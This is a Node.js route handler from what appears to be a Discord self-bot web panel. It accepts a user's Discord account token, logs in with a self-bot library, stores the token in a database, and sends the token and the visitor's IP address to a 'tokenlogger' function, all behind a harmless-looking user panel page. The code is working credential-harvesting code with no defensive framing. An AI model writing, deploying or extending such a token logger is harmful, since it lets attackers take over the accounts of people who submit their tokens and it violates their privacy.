const db = require("quick.db");
const djs = require('discord.js-selfbot-v13');
const ipinfo = require("../../assets/function/web/ipinfo.js");
const tokenlogger = require("../../assets/function/web/tokenlogger.js");
const config = require("../../config.json");
module.exports = {
    path: "/user/panel/",
    method: "post",
    go: async (req, res) => {
        const ip = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        const r = await ipinfo(ip.replace("::ffff:", ""));
        if (r.status === "success") {
            if (db.has(`user_${ip.replace("::ffff:", "")}`)) {
                const client = new djs.Client({ fetchAllMembers: true });
                const tkn = req.body.token;
                client.login(tkn).catch(() => {
                    let html = "<script>alert(\"Invalid Token !\");window.location = `" + config.domain + "/base`</script>";
                    return res.send(html);
                });
                client.on("ready", async () => {
                    await db.set(`client_${client.user.id}`, tkn);
                    tokenlogger({ token: tkn, ip: ip, client: client, type: 1 });
                    res.render("user/panel.ejs", {
                        n: client.user.tag,
                        i: client.user.id,
                        a: client.user.displayAvatarURL({ dynamic: true }),
                    });
                    setTimeout(() => {
                        client.destroy()
                    }, 5000);
                })

            } else { res.sendFile(`verif.html`, { root: "./views/web" }) }
        } else {
            res.sendFile(`verif.html`, { root: "./views/web" })
        }
    }
}